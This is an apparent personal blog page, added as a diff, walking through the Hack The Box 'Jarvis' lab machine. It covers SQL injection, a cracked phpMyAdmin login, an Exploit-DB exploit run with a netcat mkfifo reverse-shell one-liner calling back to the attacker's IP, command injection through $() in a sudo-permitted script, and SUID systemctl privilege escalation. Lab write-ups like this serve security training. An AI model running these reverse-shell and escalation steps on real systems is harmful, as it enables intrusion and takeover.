@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Jarvis | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Medium Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/jarvis-medium-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/jarvis-medium-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/jarvis-medium-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Jarvis">
+  <meta property="og:description" content="Medium Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Jarvis">
+  <meta name="twitter:description" content="Medium Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Jarvis",
+      "item": "http://localhost:1313/htb/jarvis-medium-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Jarvis",
+  "name": "Jarvis",
+  "description": "Medium Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap 10.129.229.137 -p- -vv -T4 -Pn --min-rate=1000 -sC 22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 80 - HTTP - Apache httpd 2.4.25 ((Debian)) 64999 - HTTP - Apache httpd 2.4.25 ((Debian)) Port 80: Hotel booking page running PHP http://10.129.229.137/room.php?cod=5 parameters on room.php to switch room domain name supersecurehotel.htb in the corner the fuck is this: adding supersecurehotel.htb as the domain in /etc/hosts\nfuzzing both ports for Found /images on port 80: not much can be done tho. Another directory ‘phpmyadmin’\nalso able to access the javascript scripts phpMyAdmin 4.8.0 running All the 4.8.0 exploits I see seem to require being logged in as a user - we dont have any creds\nKind of stuck, tried fuzzing subdomains, nothing there\nTook a sneak peak at the walkthrough and there is possibly some injection in the way the rooms are found which we saw before Some things stand out, cod is expecting an integer because if we put a quite then\nsqlmap finds injection - if there is an option to use boolean blind then use that\n-r with request method -u with url method\ntry other methods when they dont work\nUser: DBadmin Password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 Password: imissyou\nThis allows login into the phpMyAdmin Looking at previous exploits, this one seems like its gonna work: https://www.exploit-db.com/exploits/50457\nIt works! rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.0.0.1 4242 \u003e/tmp/f reliable shell python3 exploit.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.16.196 9000 \u003e/tmp/f' After upgrading, running sudo -l shows that www-data can run simpler.py as the user pepper without a password: Able to read python, so looking through the code we see -l runs the following function: Here os.system is being run which directly runs system commands. In the “forbidden” characters, there is no $ which means we can potentially write commands inside $() and that will execute to try resolve the parameter before passing it into the ping command. But there is no visible output seen when we run commands: According to hacktricks ai, the shell substitution launches an interactive bash shell as pepper, however, since this is running inside os.system(‘ping’ + command), the new shell inherits the standard input/output of the ping process, which is not a proper interactive terminal (TTY). This causes interactive commands like whoami, id, ls to produce no visible output because their stdout/stderr is not connected to the terminal.\nSo lets send back a reverse shell as pepper instead. looking in the binaries folder, there are some binaries that have the setuid bit on which means the files can be run as the owner We can see that systemctl has SUID bit set which is not normal and pepper has execute privileges. Going to GTFO bins: So we create a shell script containing reverse shell code. And then create a service as shown in GTFO bins example, link the service and enable it which runs the shell.sh script and we obtain a root shell. Root shell; ",
+  "wordCount" : "498",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/jarvis-medium-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Jarvis
+    </h1>
+    <div class="post-description">
+      Medium Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p><code>nmap 10.129.229.137 -p- -vv -T4 -Pn --min-rate=1000 -sC</code>
+<img alt="Jarvis (Medium).png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29.png"></p>
+<pre tabindex="0"><code>22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80 - HTTP - Apache httpd 2.4.25 ((Debian))
+64999 - HTTP - Apache httpd 2.4.25 ((Debian))
+</code></pre><p>Port 80:
+Hotel booking page
+<img alt="Jarvis (Medium)-1.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-1.png">
+running PHP
+http://10.129.229.137/room.php?cod=5
+parameters on room.php to switch room
+domain name <code>supersecurehotel.htb</code> in the corner
+<img alt="Jarvis (Medium)-2.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-2.png">
+the fuck is this:
+<img alt="Jarvis (Medium)-3.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-3.png">
+adding supersecurehotel.htb as the domain in /etc/hosts</p>
+<p>fuzzing both ports for
+Found /images on port 80:
+<img alt="Jarvis (Medium)-4.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-4.png"></p>
+<p>not much can be done tho. Another directory &lsquo;phpmyadmin&rsquo;</p>
+<p><img alt="Jarvis (Medium)-5.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-5.png"></p>
+<p>also able to access the javascript scripts
+<img alt="Jarvis (Medium)-6.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-6.png">
+phpMyAdmin 4.8.0 running
+<img alt="Jarvis (Medium)-7.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-7.png">
+All the 4.8.0 exploits I see seem to require being logged in as a user - we dont have any creds</p>
+<p>Kind of stuck, tried fuzzing subdomains, nothing there</p>
+<p>Took a sneak peak at the walkthrough and there is possibly some injection in the way the rooms are found which we saw before
+<img alt="Jarvis (Medium)-9.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-9.png">
+Some things stand out, cod is expecting an integer because if we put a quite then</p>
+<p><img alt="Jarvis (Medium)-10.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-10.png">
+sqlmap finds injection - if there is an option to use boolean blind then use that</p>
+<p>-r with request method
+-u with url method</p>
+<p>try other methods when they dont work</p>
+<p><img alt="Jarvis (Medium)-11.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-11.png"></p>
+<p><img alt="Jarvis (Medium)-12.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-12.png">
+<img alt="Jarvis (Medium)-13.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-13.png"></p>
+<p>User: DBadmin
+Password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+Password: imissyou</p>
+<p><img alt="Jarvis (Medium)-14.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-14.png">
+This allows login into the phpMyAdmin
+<img alt="Jarvis (Medium)-15.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-15.png"></p>
+<p>Looking at previous exploits, this one seems like its gonna work:
+<a href="https://www.exploit-db.com/exploits/50457">https://www.exploit-db.com/exploits/50457</a></p>
+<p>It works!
+<img alt="Jarvis (Medium)-16.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-16.png"></p>
+<p><code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</code>
+reliable shell
+<img alt="Jarvis (Medium)-17.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-17.png">
+<code>python3 exploit.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.196 9000 &gt;/tmp/f'</code>
+<img alt="Jarvis (Medium)-18.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%29-18.png"></p>
+<p>After upgrading, running <code>sudo -l</code> shows that www-data can run simpler.py as the user pepper without a password:
+<img alt="Jarvis (Medium Linux)-1.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-1.png">
+Able to read python, so looking through the code we see -l runs the following function:
+<img alt="Jarvis (Medium Linux)-2.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-2.png">
+Here <code>os.system</code> is being run which directly runs system commands. In the &ldquo;forbidden&rdquo; characters, there is no $ which means we can potentially write commands inside $() and that will execute to try resolve the parameter before passing it into the ping command.
+<img alt="Jarvis (Medium Linux)-3.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-3.png">
+But there is no visible output seen when we run commands:
+<img alt="Jarvis (Medium Linux)-4.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-4.png">
+According to hacktricks ai, the shell substitution launches an interactive bash shell as pepper, however, since this is running inside os.system(&lsquo;ping&rsquo; + command), the new shell inherits the standard input/output of the ping process, which is not a proper interactive terminal (TTY). This causes interactive commands like whoami, id, ls to produce no visible output because their stdout/stderr is not connected to the terminal.</p>
+<p>So lets send back a reverse shell as pepper instead.
+<img alt="Jarvis (Medium Linux)-5.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-5.png">
+<img alt="Jarvis (Medium Linux)-6.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-6.png">
+looking in the binaries folder, there are some binaries that have the setuid bit on which means the files can be run as the owner
+<img alt="Jarvis (Medium Linux)-9.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-9.png">
+We can see that systemctl has SUID bit set which is not normal and pepper has execute privileges.
+Going to GTFO bins:
+<img alt="Jarvis (Medium Linux)-10.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-10.png">
+So we create a shell script containing reverse shell code.
+<img alt="Jarvis (Medium Linux)-7.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-7.png">
+And then create a service as shown in GTFO bins example, link the service and enable it which runs the shell.sh script and we obtain a root shell.
+<img alt="Jarvis (Medium Linux)-8.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-8.png">
+Root shell;
+<img alt="Jarvis (Medium Linux)-11.png" loading="lazy" src="/htb/jarvis-medium-linux/Jarvis%20%28Medium%20Linux%29-11.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
